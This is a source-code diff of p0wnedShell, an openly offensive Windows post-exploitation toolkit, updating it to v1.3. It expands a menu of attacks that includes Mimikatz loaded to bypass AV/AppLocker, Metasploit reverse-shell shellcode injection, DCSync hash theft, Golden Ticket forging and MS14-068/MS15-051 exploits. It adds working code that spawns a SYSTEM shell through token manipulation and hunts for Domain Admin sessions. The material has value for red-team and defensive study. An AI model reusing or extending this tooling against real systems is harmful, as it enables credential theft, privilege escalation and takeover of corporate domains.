@@ -5,12 +5,12 @@
 *   / /_/ / /_/ /| |/ |/ / / / /  __/ /_/ /___/ / / / /  __/ / /    *
 *  / .___/\____/ |__/|__/_/ /_/\___/\__,_//____/_/ /_/\___/_/_/     *
 * /_/                                                               *
-*                                    By Cn33liz and Skons 2015      *
+*                                    By Cn33liz and Skons 2016      *
 *                                                                   *
 * PowerShell Runspace Post Exploitation Toolkit                     *
 * For Bitch Ass Admins that tried to block our PowerShell candy ;)  *
 *                                                                   *
-*                                                              v1.2 *
+*                                                              v1.3 *
 \*******************************************************************/
 
 /*
@@ -84,7 +84,7 @@ namespace p0wnedShell
             Console.WriteLine(@"*   / /_/ / /_/ /| |/ |/ / / / /  __/ /_/ /___/ / / / /  __/ / /    *");
             Console.WriteLine(@"*  / .___/\____/ |__/|__/_/ /_/\___/\__,_//____/_/ /_/\___/_/_/     *");
             Console.WriteLine(@"* /_/                                                               *");
-            Console.WriteLine(@"*                                    /By Cn33liz and Skons 2015\    *");
+            Console.WriteLine(@"*                                    /By Cn33liz and Skons 2016\    *");
             Console.WriteLine(@"*                                       \Cornelis@dePlaa.com/       *");
             Console.WriteLine(@"*                                                                   *");
             if (toPrint != null)
@@ -94,7 +94,7 @@ namespace p0wnedShell
                     Console.WriteLine(item);
                 }
             }
-            Console.WriteLine(@"*                                                              v1.2 *");
+            Console.WriteLine(@"*                                                              v1.3 *");
             Console.WriteLine(@"*********************************************************************");
             Console.ResetColor();
             Console.WriteLine();
@@ -181,56 +181,50 @@ namespace p0wnedShell
         public static int DisplayMenu()
         {
             string[] toPrint = { "* PowerShell Runspace Post Exploitation Toolkit                     *",
-                                 "* For Bitch Ass Admins that try to block our PowerShell candy ;)    *",
-                                 "*                                                                   *" };
+                                 "* Let's get your Blue Team out of Hibernation mode.                 *" };
             Program.PrintBanner(toPrint);
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Information Gathering:\n");
             Console.ResetColor();
             Console.WriteLine(" 1. Use PowerView to gain network situational awareness on Windows Domains.");
-            Console.WriteLine();
-            Console.WriteLine(" 2. Scan for IP-Addresses, HostNames and open Ports in your Network.");
+            Console.WriteLine(" 2. Find machines in the Domain where Domain Admins are logged into.");
+            Console.WriteLine(" 3. Scan for IP-Addresses, HostNames and open Ports in your Network.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Code Execution:\n");
             Console.ResetColor();
-            Console.WriteLine(" 3. Reflectively load Mimikatz executable into Memory, bypassing AV/AppLocker.");
-            Console.WriteLine();
-            Console.WriteLine(" 4. Inject Metasploit reversed https Shellcode into Memory.");
+            Console.WriteLine(" 4. Reflectively load Mimikatz executable into Memory, bypassing AV/AppLocker.");
+            Console.WriteLine(" 5. Inject Metasploit reversed https Shellcode into Memory.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Privilege Escalation:\n");
             Console.ResetColor();
-            Console.WriteLine(" 5. Use PowerUp tool to assist with local privilege escalation on Windows Systems.");
-            Console.WriteLine();
-            Console.WriteLine(" 6. Use Mimikatz dcsync to collect NTLM hashes from the Domain.");
-            Console.WriteLine();
-            Console.WriteLine(" 7. Use Mimikatz to generate a Golden Ticket for the Domain.");
+            Console.WriteLine(" 6. Use PowerUp tool to assist with local Privilege Escalation on Windows Systems.");
+            Console.WriteLine(" 7. Get a SYSTEM shell using Token Manipulation.");
+            Console.WriteLine(" 8. Tater \"The Posh Hot Potato\" Windows Privilege Escalation exploit.");
+            Console.WriteLine(" 9. Use Mimikatz dcsync to collect NTLM hashes from the Domain.");
+            Console.WriteLine(" 10. Use Mimikatz to generate a Golden Ticket for the Domain.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Exploitation:\n");
             Console.ResetColor();
-            Console.WriteLine(" 8. Get into Ring0 using the MS14-058 and MS15-051 Vulnerability.");
-            Console.WriteLine();
-            Console.WriteLine(" 9. Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability.");
+            Console.WriteLine(" 11. Get into Ring0 using the MS14-058 and MS15-051 Vulnerability.");
+            Console.WriteLine(" 12. Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Lateral Movement:\n");
             Console.ResetColor();
-            Console.WriteLine(" 10. Use PsExec to execute commands on remote system.");
-            Console.WriteLine();
-            Console.WriteLine(" 11. Execute Mimikatz on a remote computer to dump credentials.");
-            Console.WriteLine();
-            Console.WriteLine(" 12. PowerCat our PowerShell TCP/IP Swiss Army Knife.");
+            Console.WriteLine(" 13. Use PsExec to execute commands on remote system.");
+            Console.WriteLine(" 14. Execute Mimikatz on a remote computer to dump credentials.");
+            Console.WriteLine(" 15. PowerCat our PowerShell TCP/IP Swiss Army Knife.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Others:\n");
             Console.ResetColor();
-            Console.WriteLine(" 13. Execute PowerShell Commands (Including PowerSploit and Veil's PowerTools Post Exploitation Modules).");
+            Console.WriteLine(" 16. Execute (Offensive) PowerShell Commands.");
+            Console.WriteLine(" 17. Reflectively load a ReactOS Command shell into Memory, bypassing AV/AppLocker.");
             Console.WriteLine();
-            Console.WriteLine(" 14. Reflectively load a ReactOS Command shell into Memory, bypassing AV/AppLocker.");
-            Console.WriteLine();
-            Console.WriteLine("\n 15. Exit");
+            Console.WriteLine(" 18. Exit");
             Console.Write("\nEnter choice: ");
             var result = Console.ReadLine();
 
@@ -260,9 +254,12 @@ namespace p0wnedShell
                         Pshell.PowerView();
                         break;
                     case 2:
-                        Pshell.PortScan();
+                        Pshell.AdminHunter();
                         break;
                     case 3:
+                        Pshell.PortScan();
+                        break;
+                    case 4:
                         if (Arch == "AMD64")
                         {
                             Pshell.MimiShell();
@@ -276,7 +273,7 @@ namespace p0wnedShell
                             Console.ReadLine();
                         }
                         break;
-                    case 4:
+                    case 5:
                         if (Arch == "x86")
                         {
                             Pshell.Meterpreter();
@@ -290,10 +287,16 @@ namespace p0wnedShell
                             Console.ReadLine();
                         }
                         break;
-                    case 5:
+                    case 6:
                         Pshell.PowerUp();
                         break;
-                    case 6:
+                    case 7:
+                        Pshell.SystemShell();
+                        break;
+                    case 8:
+                        Potato.TaterMenu();
+                        break;
+                    case 9:
                         if (Arch == "AMD64")
                         {
                             Pshell.DCSync();
@@ -307,7 +310,7 @@ namespace p0wnedShell
                             Console.ReadLine();
                         }
                         break;
-                    case 7:
+                    case 10:
                         if (Arch == "AMD64")
                         {
                             Pshell.GoldenTicket();
@@ -321,10 +324,10 @@ namespace p0wnedShell
                             Console.ReadLine();
                         }
                         break;
-                    case 8:
+                    case 11:
                         Exploits.ExploitMenu();
                         break;
-                    case 9:
+                    case 12:
                         if (Arch == "x86")
                         {
                             Pshell.MS14_068();
@@ -338,7 +341,7 @@ namespace p0wnedShell
                             Console.ReadLine();
                         }
                         break;
-                    case 10:
+                    case 13:
                         if (Arch == "x86")
                         {
                             Pshell.PsExec();
@@ -352,16 +355,16 @@ namespace p0wnedShell
                             Console.ReadLine();
                         }
                         break;
-                    case 11:
+                    case 14:
                         Pshell.Remote_Mimikatz();
                         break;
-                    case 12:
+                    case 15:
                         PowerCat.PowerMenu();
                         break;
-                    case 13:
+                    case 16:
                         Pshell.InvokeShell();
                         break;
-                    case 14:
+                    case 17:
                         if (Arch == "x86")
                         {
                             Pshell.ReactShell();
@@ -382,7 +385,7 @@ namespace p0wnedShell
                         break;
                 }
 
-            } while (userInput != 15);
+            } while (userInput != 18);
         }
     }
 
@@ -476,8 +479,8 @@ namespace p0wnedShell
             Console.Write("[+] PowerSploit Invoke-ReflectivePEInjection\n");
             Console.Write("[+] PowerSploit Invoke-Mimikatz\n");
             Console.Write("[+] PowerSploit Invoke-TokenManipulation\n");
-            Console.Write("[+] Veil's PowerTools PowerUp\n");
-            Console.Write("[+] Veil's PowerTools PowerView\n");
+            Console.Write("[+] PowerSploit PowerUp\n");
+            Console.Write("[+] PowerSploit PowerView\n");
             Console.Write("[+] HarmJ0y's Invoke-Psexec\n");
             Console.Write("[+] Besimorhino's PowerCat\n");
             Console.Write("[+] Nishang Invoke-PsUACme\n");
@@ -486,6 +489,7 @@ namespace p0wnedShell
             Console.Write("[+] Nishang Invoke-CredentialsPhish\n");
             Console.Write("[+] Nishang Port-Scan\n");
             Console.Write("[+] Nishang Copy-VSS\n");
+            Console.Write("[+] Kevin Robertson Invoke-Tater\n");
             Console.Write("[+] Kevin Robertson Invoke-Inveigh\n\n");
             Console.Write("[+] Use Get-Help <ModuleName> for syntax usage and Have Fun :)\n\n");
             Console.ResetColor();
@@ -980,6 +984,46 @@ namespace p0wnedShell
 
         }
 
+        public static void SystemShell()
+        {
+            string[] toPrint = { "* Get a SYSTEM shell using Token Manipulation                       *" };
+            Program.PrintBanner(toPrint);
+
+            Console.WriteLine("[+] For this attack to succeed, you need Local Administrator account privileges.");
+            Console.Write("[+] Do you have the required permissions? (y/n) > ");
+            string input = Console.ReadLine();
+            switch (input.ToLower())
+            {
+                case "y":
+                    Console.WriteLine("[+] Please wait for our SYSTEM shell to Popup...\n");
+                    string SystemShell = "Invoke-TokenManipulation -CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"";
+                    try
+                    {
+                        P0wnedListener.Execute(SystemShell);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e.Message);
+                    }
+                    break;
+                case "n":
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
+                    Console.ResetColor();
+                    Console.WriteLine("Press Enter to Continue...");
+                    Console.ReadLine();
+                    return;
+                default:
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
+                    Console.ResetColor();
+                    Console.WriteLine("Press Enter to Continue...");
+                    Console.ReadLine();
+                    return;
+            }
+            return;
+        }
+
         public static void PowerUp()
         {
             string[] toPrint = { "* Use PowerUp to assist with local privilege escalation.            *" };
@@ -1000,6 +1044,42 @@ namespace p0wnedShell
             Console.WriteLine("[+] Check above recommendations to assist with local privilege escalation.\n");
             Console.ResetColor();
             P0wnedListener.CommandShell();
+            return;
+        }
+
+        public static void AdminHunter()
+        {
+            string[] toPrint = { "* Finds machines in the Domain where Domain Admins are logged into. *" };
+            Program.PrintBanner(toPrint);
+
+            string DomainJoined = String.Empty;
+            try
+            {
+                DomainJoined = Domain.GetComputerDomain().Name;
+            }
+            catch
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
+                Console.ResetColor();
+                Console.WriteLine("Press Enter to Continue...");
+                Console.ReadLine();
+                return;
+            }
+
+            Console.Write("[+] Please wait, this could take a while on large Domains...\n");
+
+            string UserHunter = "Invoke-UserHunter -CheckAccess";
+            try
+            {
+                P0wnedListener.Execute(UserHunter);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+            Console.WriteLine("\nPress Enter to Continue...");
+            Console.ReadLine();
             return;
         }
 
